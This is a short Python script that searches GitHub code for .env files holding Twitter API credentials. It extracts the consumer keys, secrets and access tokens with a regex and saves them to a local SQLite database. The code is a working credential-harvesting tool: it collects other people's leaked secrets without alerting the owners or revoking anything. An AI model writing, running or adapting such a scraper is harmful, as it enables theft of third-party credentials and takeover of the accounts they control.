import re
import sqlite3
from github import Github
import os

# Initialize GitHub API with Dependabot secret
github_token = os.getenv('GITCLASIC_TOKEN')  # GitHub token from Dependabot secret
g = Github(github_token)

def search_github_keys(query, max_repos=10):
    """Search GitHub for exposed API keys"""
    keys = []
    repos = g.search_code(query=query, per_page=max_repos)
    pattern = re.compile(r'TWITTER_CONSUMER_KEY="([^"]+)"\s+TWITTER_CONSUMER_SECRET="([^"]+)"\s+TWITTER_ACCESS_TOKEN="([^"]+)"\s+TWITTER_ACCESS_SECRET="([^"]+)"')

    for repo in repos:
        content = repo.decoded_content.decode('utf-8')
        matches = pattern.findall(content)
        for match in matches:
            keys.append({
                'consumer_key': match[0],
                'consumer_secret': match[1],
                'access_token': match[2],
                'access_secret': match[3],
            })

    return keys

def save_to_db(keys):
    """Save keys to the database"""
    conn = sqlite3.connect('keys.db')
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS twitter_keys (
            consumer_key TEXT,
            consumer_secret TEXT,
            access_token TEXT,
            access_secret TEXT
        )
    ''')

    for key in keys:
        cursor.execute('''
            INSERT INTO twitter_keys (consumer_key, consumer_secret, access_token, access_secret)
            VALUES (?, ?, ?, ?)
        ''', (key['consumer_key'], key['consumer_secret'], key['access_token'], key['access_secret']))

    conn.commit()
    conn.close()

# Search GitHub and save keys
query = 'TWITTER_CONSUMER_KEY filename:.env'
keys = search_github_keys(query)
save_to_db(keys)
